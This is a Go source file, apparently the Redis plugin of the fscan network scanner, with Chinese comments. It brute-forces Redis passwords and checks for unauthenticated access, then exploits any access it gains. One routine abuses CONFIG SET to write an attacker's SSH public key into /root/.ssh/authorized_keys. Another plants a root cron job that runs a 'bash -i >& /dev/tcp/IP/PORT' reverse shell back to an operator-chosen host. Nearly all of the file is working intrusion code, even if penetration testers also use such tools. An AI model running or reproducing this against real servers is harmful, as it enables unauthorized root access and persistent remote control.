package Plugins

import (
	"bufio"
	"fmt"
	"github.com/shadow1ng/fscan/Common"
	"io"
	"net"
	"os"
	"strings"
	"time"
)

var (
	dbfilename string // Redis数据库文件名
	dir        string // Redis数据库目录
)

// RedisScan 执行Redis服务扫描
func RedisScan(info *Common.HostInfo) (tmperr error) {
	fmt.Println("[+] Redis扫描模块开始...")
	starttime := time.Now().Unix()

	// 尝试无密码连接
	flag, err := RedisUnauth(info)
	if flag && err == nil {
		return err
	}

	if Common.IsBrute {
		return
	}

	// 尝试密码暴力破解
	for _, pass := range Common.Passwords {
		pass = strings.Replace(pass, "{user}", "redis", -1)

		flag, err := RedisConn(info, pass)
		if flag && err == nil {
			return err
		}

		// 记录错误信息
		errlog := fmt.Sprintf("[-] Redis %v:%v %v %v", info.Host, info.Ports, pass, err)
		Common.LogError(errlog)
		tmperr = err

		if Common.CheckErrs(err) {
			return err
		}

		// 超时检查
		if time.Now().Unix()-starttime > (int64(len(Common.Passwords)) * Common.Timeout) {
			return err
		}
	}
	fmt.Println("[+] Redis扫描模块结束...")
	return tmperr
}

// RedisConn 尝试Redis连接
func RedisConn(info *Common.HostInfo, pass string) (bool, error) {
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)

	// 建立TCP连接
	conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
	if err != nil {
		return false, err
	}
	defer conn.Close()

	// 设置超时
	if err = conn.SetReadDeadline(time.Now().Add(time.Duration(Common.Timeout) * time.Second)); err != nil {
		return false, err
	}

	// 发送认证命令
	if _, err = conn.Write([]byte(fmt.Sprintf("auth %s\r\n", pass))); err != nil {
		return false, err
	}

	// 读取响应
	reply, err := readreply(conn)
	if err != nil {
		return false, err
	}

	// 认证成功
	if strings.Contains(reply, "+OK") {
		// 获取配置信息
		dbfilename, dir, err = getconfig(conn)
		if err != nil {
			result := fmt.Sprintf("[+] Redis %s %s", realhost, pass)
			Common.LogSuccess(result)
			return true, err
		}

		result := fmt.Sprintf("[+] Redis %s %s file:%s/%s", realhost, pass, dir, dbfilename)
		Common.LogSuccess(result)

		// 尝试利用
		err = Expoilt(realhost, conn)
		return true, err
	}

	return false, err
}

// RedisUnauth 尝试Redis未授权访问检测
func RedisUnauth(info *Common.HostInfo) (flag bool, err error) {
	flag = false
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)

	// 建立TCP连接
	conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
	if err != nil {
		Common.LogError(fmt.Sprintf("[-] Redis连接失败 %s: %v", realhost, err))
		return flag, err
	}
	defer conn.Close()

	// 设置读取超时
	if err = conn.SetReadDeadline(time.Now().Add(time.Duration(Common.Timeout) * time.Second)); err != nil {
		Common.LogError(fmt.Sprintf("[-] Redis %s 设置超时失败: %v", realhost, err))
		return flag, err
	}

	// 发送info命令测试未授权访问
	_, err = conn.Write([]byte("info\r\n"))
	if err != nil {
		Common.LogError(fmt.Sprintf("[-] Redis %s 发送命令失败: %v", realhost, err))
		return flag, err
	}

	// 读取响应
	reply, err := readreply(conn)
	if err != nil {
		Common.LogError(fmt.Sprintf("[-] Redis %s 读取响应失败: %v", realhost, err))
		return flag, err
	}

	// 判断是否存在未授权访问
	if strings.Contains(reply, "redis_version") {
		flag = true
		// 获取Redis配置信息
		dbfilename, dir, err = getconfig(conn)
		if err != nil {
			result := fmt.Sprintf("[+] Redis %s 发现未授权访问", realhost)
			Common.LogSuccess(result)
			return flag, err
		}

		// 输出详细信息
		result := fmt.Sprintf("[+] Redis %s 发现未授权访问 文件位置:%s/%s", realhost, dir, dbfilename)
		Common.LogSuccess(result)

		// 尝试漏洞利用
		err = Expoilt(realhost, conn)
		if err != nil {
			Common.LogError(fmt.Sprintf("[-] Redis %s 漏洞利用失败: %v", realhost, err))
		}
	}

	return flag, err
}

// Expoilt 尝试Redis漏洞利用
func Expoilt(realhost string, conn net.Conn) error {
	// 如果配置为不进行测试则直接返回
	if Common.Noredistest {
		return nil
	}

	// 测试目录写入权限
	flagSsh, flagCron, err := testwrite(conn)
	if err != nil {
		Common.LogError(fmt.Sprintf("[-] Redis %v 测试写入权限失败: %v", realhost, err))
		return err
	}

	// SSH密钥写入测试
	if flagSsh {
		Common.LogSuccess(fmt.Sprintf("[+] Redis %v 可写入路径 /root/.ssh/", realhost))

		// 如果指定了密钥文件则尝试写入
		if Common.RedisFile != "" {
			writeok, text, err := writekey(conn, Common.RedisFile)
			if err != nil {
				Common.LogError(fmt.Sprintf("[-] Redis %v SSH密钥写入错误: %v %v", realhost, text, err))
				return err
			}

			if writeok {
				Common.LogSuccess(fmt.Sprintf("[+] Redis %v SSH公钥写入成功", realhost))
			} else {
				Common.LogError(fmt.Sprintf("[-] Redis %v SSH公钥写入失败: %v", realhost, text))
			}
		}
	}

	// 定时任务写入测试
	if flagCron {
		Common.LogSuccess(fmt.Sprintf("[+] Redis %v 可写入路径 /var/spool/cron/", realhost))

		// 如果指定了shell命令则尝试写入定时任务
		if Common.RedisShell != "" {
			writeok, text, err := writecron(conn, Common.RedisShell)
			if err != nil {
				Common.LogError(fmt.Sprintf("[-] Redis %v 定时任务写入错误: %v", realhost, err))
				return err
			}

			if writeok {
				Common.LogSuccess(fmt.Sprintf("[+] Redis %v 成功写入 /var/spool/cron/root", realhost))
			} else {
				Common.LogError(fmt.Sprintf("[-] Redis %v 定时任务写入失败: %v", realhost, text))
			}
		}
	}

	// 恢复数据库配置
	if err = recoverdb(dbfilename, dir, conn); err != nil {
		Common.LogError(fmt.Sprintf("[-] Redis %v 恢复数据库失败: %v", realhost, err))
	}

	return err
}

// writekey 向Redis写入SSH密钥
func writekey(conn net.Conn, filename string) (flag bool, text string, err error) {
	flag = false

	// 设置文件目录为SSH目录
	_, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}

	// 设置文件名为authorized_keys
	if strings.Contains(text, "OK") {
		_, err = conn.Write([]byte("CONFIG SET dbfilename authorized_keys\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}

		// 读取并写入SSH密钥
		if strings.Contains(text, "OK") {
			// 读取密钥文件
			key, err := Readfile(filename)
			if err != nil {
				text = fmt.Sprintf("[-] 读取密钥文件 %s 失败: %v", filename, err)
				return flag, text, err
			}
			if len(key) == 0 {
				text = fmt.Sprintf("[-] 密钥文件 %s 为空", filename)
				return flag, text, err
			}

			// 写入密钥
			_, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key)))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}

			// 保存更改
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte("save\r\n"))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}

	// 截断过长的响应文本
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}

	return flag, text, err
}

// writecron 向Redis写入定时任务
func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
	flag = false

	// 首先尝试Ubuntu系统的cron路径
	_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/crontabs/\r\n"))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}

	// 如果Ubuntu路径失败，尝试CentOS系统的cron路径
	if !strings.Contains(text, "OK") {
		_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
	}

	// 如果成功设置目录，继续后续操作
	if strings.Contains(text, "OK") {
		// 设置数据库文件名为root
		_, err = conn.Write([]byte("CONFIG SET dbfilename root\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}

		if strings.Contains(text, "OK") {
			// 解析目标主机地址
			target := strings.Split(host, ":")
			if len(target) < 2 {
				return flag, "[-] 主机地址格式错误", err
			}
			scanIp, scanPort := target[0], target[1]

			// 写入反弹shell的定时任务
			cronCmd := fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n",
				scanIp, scanPort)
			_, err = conn.Write([]byte(cronCmd))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}

			// 保存更改
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte("save\r\n"))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}

	// 截断过长的响应文本
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}

	return flag, text, err
}

// Readfile 读取文件内容并返回第一个非空行
func Readfile(filename string) (string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return "", err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			return text, nil
		}
	}
	return "", err
}

// readreply 读取Redis服务器响应
func readreply(conn net.Conn) (string, error) {
	// 设置1秒读取超时
	conn.SetReadDeadline(time.Now().Add(time.Second))

	bytes, err := io.ReadAll(conn)
	// 如果读取到内容则不返回错误
	if len(bytes) > 0 {
		err = nil
	}
	return string(bytes), err
}

// testwrite 测试Redis写入权限
func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
	// 测试SSH目录写入权限
	_, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
	if err != nil {
		return flag, flagCron, err
	}
	text, err := readreply(conn)
	if err != nil {
		return flag, flagCron, err
	}
	if strings.Contains(text, "OK") {
		flag = true
	}

	// 测试定时任务目录写入权限
	_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n"))
	if err != nil {
		return flag, flagCron, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, flagCron, err
	}
	if strings.Contains(text, "OK") {
		flagCron = true
	}

	return flag, flagCron, err
}

// getconfig 获取Redis配置信息
func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
	// 获取数据库文件名
	_, err = conn.Write([]byte("CONFIG GET dbfilename\r\n"))
	if err != nil {
		return
	}
	text, err := readreply(conn)
	if err != nil {
		return
	}

	// 解析数据库文件名
	text1 := strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dbfilename = text1[len(text1)-2]
	} else {
		dbfilename = text1[0]
	}

	// 获取数据库目录
	_, err = conn.Write([]byte("CONFIG GET dir\r\n"))
	if err != nil {
		return
	}
	text, err = readreply(conn)
	if err != nil {
		return
	}

	// 解析数据库目录
	text1 = strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dir = text1[len(text1)-2]
	} else {
		dir = text1[0]
	}

	return
}

// recoverdb 恢复Redis数据库配置
func recoverdb(dbfilename string, dir string, conn net.Conn) (err error) {
	// 恢复数据库文件名
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", dbfilename)))
	if err != nil {
		return
	}
	_, err = readreply(conn)
	if err != nil {
		return
	}

	// 恢复数据库目录
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dir)))
	if err != nil {
		return
	}
	_, err = readreply(conn)
	if err != nil {
		return
	}

	return
}
